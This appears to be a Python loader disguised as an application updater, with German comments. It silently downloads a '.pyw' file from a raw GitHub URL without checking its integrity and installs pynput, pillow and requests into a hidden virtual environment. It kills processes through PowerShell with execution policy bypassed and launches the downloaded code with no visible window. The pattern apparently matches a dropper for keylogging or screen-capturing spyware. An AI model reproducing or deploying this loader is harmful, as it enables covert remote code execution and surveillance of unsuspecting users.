import ssl
import sys
import os
from pathlib import Path
import time
import urllib.request
import subprocess
import shutil


# ────────────────────────────────────────────────
# BASISPFADE

SCRIPT_PATH = Path(__file__).resolve()
SCRIPT_DIR = SCRIPT_PATH.parent

# Nicht in SCRIPT_DIR wechseln, wenn SCRIPT_DIR ein UNC-Pfad ist.
# Die Runtime/.env/logs/venv liegen lokal.
BASE_DIR = SCRIPT_DIR

IS_WINDOWS = os.name == "nt"
USERPROFILE = os.environ.get("USERPROFILE", str(Path.home()))
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", str(Path(USERPROFILE) / "AppData" / "Local"))
APP_NAME = "UpdateFramework"
LOCAL_RUNTIME_DIR = Path(LOCALAPPDATA) / APP_NAME
LOG_DIR = LOCAL_RUNTIME_DIR / "logs"


# ────────────────────────────────────────────────
# KONFIGURATION

FILE_NAME = "applicationdebugger.pyw"
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

APP_PATH = BASE_DIR / FILE_NAME

# venv liegt immer lokal, NICHT neben der App, wenn die App auf UNC liegt.
VENV_DIR = LOCAL_RUNTIME_DIR / ".venv"

if IS_WINDOWS:
    VENV_PY = VENV_DIR / "Scripts" / "python.exe"
    VENV_PYW = VENV_DIR / "Scripts" / "pythonw.exe"
else:
    VENV_PY = VENV_DIR / "bin" / "python"
    VENV_PYW = VENV_PY

# pip-Paketname, Importname
DEPENDENCIES = [
    ("requests", "requests"),
    ("pynput", "pynput"),
    ("pillow", "PIL"),
]

APP_LOG = LOG_DIR / "app_error.log"
INSTALLER_LOG = LOG_DIR / "updater.log"


# ────────────────────────────────────────────────
# HILFSFUNKTIONEN

def log(message: str) -> None:
    text = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    print(text)
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        with open(INSTALLER_LOG, "a", encoding="utf-8") as f:
            f.write(text + "\n")
    except Exception:
        pass


def _no_window_flags() -> int:
    if not IS_WINDOWS:
        return 0
    try:
        return subprocess.CREATE_NO_WINDOW  # type: ignore[attr-defined]
    except Exception:
        return 0


def run_logged(cmd, timeout=120, cwd=None) -> subprocess.CompletedProcess:
    log("$ " + " ".join(f'\"{c}\"' if " " in str(c) else str(c) for c in cmd))
    try:
        r = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=str(cwd or LOCAL_RUNTIME_DIR),
            timeout=timeout,
            creationflags=_no_window_flags(),
        )
        if r.stdout.strip():
            log("STDOUT: " + r.stdout.strip()[-4000:])
        if r.stderr.strip():
            log("STDERR: " + r.stderr.strip()[-4000:])
        log(f"Returncode: {r.returncode}")
        return r
    except subprocess.TimeoutExpired:
        log(f"TIMEOUT nach {timeout}s: {' '.join(map(str, cmd))}")
        raise


def get_venv_python(prefer_pythonw: bool = False) -> Path:
    if prefer_pythonw and VENV_PYW.exists():
        return VENV_PYW
    if VENV_PY.exists():
        return VENV_PY
    if VENV_PYW.exists():
        return VENV_PYW
    return VENV_PY


def powershell_single_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


# ────────────────────────────────────────────────
# PROZESS BEENDEN

def kill_running_main() -> None:
    """Beendet laufende Prozesse, deren CommandLine auf APP_PATH zeigt."""
    if not IS_WINDOWS:
        return

    try:
        quoted_path = powershell_single_quote(str(APP_PATH))
        command = (
            "$target = " + quoted_path + "; "
            "Get-CimInstance Win32_Process | "
            "Where-Object { $_.CommandLine -and $_.CommandLine -like ('*' + $target + '*') } | "
            "ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"
        )
        subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )
        time.sleep(1)
    except Exception as e:
        log(f"kill_running_main Fehler: {e}")


# ────────────────────────────────────────────────
# UPDATE HERUNTERLADEN

def download_update() -> Path | None:
    temp_path = APP_PATH.with_suffix(APP_PATH.suffix + ".new")

    try:
        context = ssl.create_default_context()
        req = urllib.request.Request(
            UPDATE_URL,
            headers={
                "Pragma": "no-cache",
                "Cache-Control": "no-cache",
                "User-Agent": "Python-Updater",
            },
        )
        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            status = getattr(resp, "status", 200)
            if status != 200:
                log(f"Update-Download fehlgeschlagen. HTTP Status: {status}")
                return None
            data = resp.read()

        if not data:
            log("Update-Download fehlgeschlagen: leere Datei.")
            return None

        BASE_DIR.mkdir(parents=True, exist_ok=True)
        with open(temp_path, "wb") as f:
            f.write(data)

        log(f"Update heruntergeladen: {temp_path}")
        return temp_path

    except Exception as e:
        log(f"download_update Fehler: {e}")
        if temp_path.exists():
            try:
                temp_path.unlink()
            except Exception:
                pass
        return None


# ────────────────────────────────────────────────
# UPDATE ANWENDEN

def apply_update(temp_file: Path) -> bool:
    attempts = 5

    for i in range(attempts):
        try:
            if APP_PATH.exists():
                try:
                    APP_PATH.unlink()
                except PermissionError:
                    log("APP_PATH gesperrt. Versuche laufende App zu beenden.")
                    kill_running_main()
                    time.sleep(1 + i)

            shutil.move(str(temp_file), str(APP_PATH))
            try:
                os.chmod(APP_PATH, 0o755)
            except Exception:
                pass

            log("Update erfolgreich angewendet.")
            return True

        except PermissionError:
            log("PermissionError beim Update. Neuer Versuch.")
            kill_running_main()
            time.sleep(1 + i)
        except Exception as e:
            log(f"apply_update Fehler: {e}")
            return False

    log("Update konnte nach mehreren Versuchen nicht angewendet werden.")
    return False


# ────────────────────────────────────────────────
# VENV ERSTELLEN

def venv_has_pip() -> bool:
    if not VENV_PY.exists():
        return False
    try:
        r = run_logged([str(VENV_PY), "-m", "pip", "--version"], timeout=30)
        return r.returncode == 0
    except Exception:
        return False


def remove_broken_venv() -> None:
    if VENV_DIR.exists():
        log(f"Entferne defekte/halb erstellte venv: {VENV_DIR}")
        try:
            shutil.rmtree(VENV_DIR)
        except Exception as e:
            log(f"Konnte defekte venv nicht löschen: {e}")


def try_install_venv() -> bool:
    """Erstellt lokale venv, falls nicht vorhanden oder kaputt."""
    LOCAL_RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    log(f"APP_DIR: {BASE_DIR}")
    log(f"Lokale venv: {VENV_DIR}")

    if VENV_PY.exists() and venv_has_pip():
        log("Virtual environment already ready.")
        return True

    remove_broken_venv()

    try:
        log("Erstelle virtuelle Umgebung lokal, ohne pip...")
        result = run_logged([sys.executable, "-m", "venv", "--without-pip", str(VENV_DIR)], timeout=120)
        if result.returncode != 0 or not VENV_PY.exists():
            log("Failed to create virtual environment.")
            return False

        log("Installiere pip per ensurepip...")
        result = run_logged([str(VENV_PY), "-m", "ensurepip", "--upgrade"], timeout=120)
        if result.returncode != 0:
            log("ensurepip fehlgeschlagen.")
            return False

        if not venv_has_pip():
            log("pip funktioniert nach ensurepip nicht.")
            return False

        log("Virtual environment created.")
        return True

    except subprocess.TimeoutExpired:
        log("venv-Erstellung Timeout. Abbruch statt Hängenbleiben.")
        return False
    except Exception as e:
        log(f"try_install_venv Fehler: {e}")
        return False


# ────────────────────────────────────────────────
# MODULPRÜFUNG

def venv_has(import_name: str) -> bool:
    exe = get_venv_python(prefer_pythonw=False)
    if not exe.exists():
        return False

    code = (
        "import importlib.util, sys; "
        f"sys.exit(0 if importlib.util.find_spec({import_name!r}) else 1)"
    )

    try:
        r = run_logged([str(exe), "-c", code], timeout=30)
        return r.returncode == 0
    except Exception:
        return False


# ────────────────────────────────────────────────
# DEPENDENCIES INSTALLIEREN

def install_dependencies() -> None:
    exe = get_venv_python(prefer_pythonw=False)

    if not exe.exists():
        log("venv Python nicht gefunden. Dependencies können nicht installiert werden.")
        return

    log("Aktualisiere pip/setuptools/wheel...")
    try:
        run_logged(
            [str(exe), "-m", "pip", "install", "--disable-pip-version-check", "--upgrade", "pip", "setuptools", "wheel"],
            timeout=180,
        )
    except Exception as e:
        log(f"pip-Upgrade fehlgeschlagen, fahre trotzdem fort: {e}")

    for pip_name, import_name in DEPENDENCIES:
        if venv_has(import_name):
            log(f"Dependency already installed: {pip_name}")
            continue

        log(f"Installing dependency into venv: {pip_name}")
        try:
            result = run_logged(
                [str(exe), "-m", "pip", "install", "--disable-pip-version-check", "--prefer-binary", pip_name],
                timeout=300,
            )
            if result.returncode == 0 and venv_has(import_name):
                log(f"Dependency installed successfully: {pip_name}")
            else:
                log(f"Failed to install dependency: {pip_name}")
        except subprocess.TimeoutExpired:
            log(f"Timeout beim Installieren von {pip_name}")
        except Exception as e:
            log(f"Installationsfehler bei {pip_name}: {e}")


# ────────────────────────────────────────────────
# HAUPTANWENDUNG STARTEN

def start_main_app() -> bool:
    if not APP_PATH.exists():
        log(f"APP_PATH nicht gefunden: {APP_PATH}")
        return False

    exe = get_venv_python(prefer_pythonw=True)
    if not exe.exists():
        log(f"venv Python nicht gefunden: {exe}")
        return False

    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        log_file = open(APP_LOG, "ab")
        child_env = os.environ.copy()
        child_env["UPDATEFRAMEWORK_CONFIG_DIR"] = str(BASE_DIR)
        child_env["UPDATEFRAMEWORK_RUNTIME_DIR"] = str(LOCAL_RUNTIME_DIR)
        child_env["UPDATEFRAMEWORK_LOG_DIR"] = str(LOG_DIR)
        subprocess.Popen(
            [str(exe), str(APP_PATH)],
            stdout=log_file,
            stderr=log_file,
            stdin=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
            cwd=str(LOCAL_RUNTIME_DIR),
            env=child_env,
        )
        log(f"Hauptanwendung gestartet. Fehlerlog: {APP_LOG}")
        log(f"Bearbeitbare .env: {BASE_DIR / '.env'}")
        return True
    except Exception as e:
        log(f"Startfehler: {e}")
        return False


# ────────────────────────────────────────────────
# MAIN

def main() -> None:
    LOCAL_RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    log("Updater gestartet.")

    if str(VENV_DIR).startswith(r"\\"):
        log("FEHLER: VENV_DIR ist UNC. Das darf nicht passieren.")
        sys.exit(1)

    kill_running_main()

    new_file = download_update()
    if new_file:
        ok = apply_update(new_file)
        if not ok:
            log("Update konnte nicht angewendet werden.")
    else:
        log("Kein Update angewendet.")

    if try_install_venv():
        install_dependencies()
        log("Virtual environment is ready.")
    else:
        log("Failed to create virtual environment. Starte trotzdem, falls möglich.")

    started = start_main_app()
    if not started:
        log("Konnte Hauptanwendung nicht starten.")

    log("Updater beendet.")
    sys.exit(0)


if __name__ == "__main__":
    main()
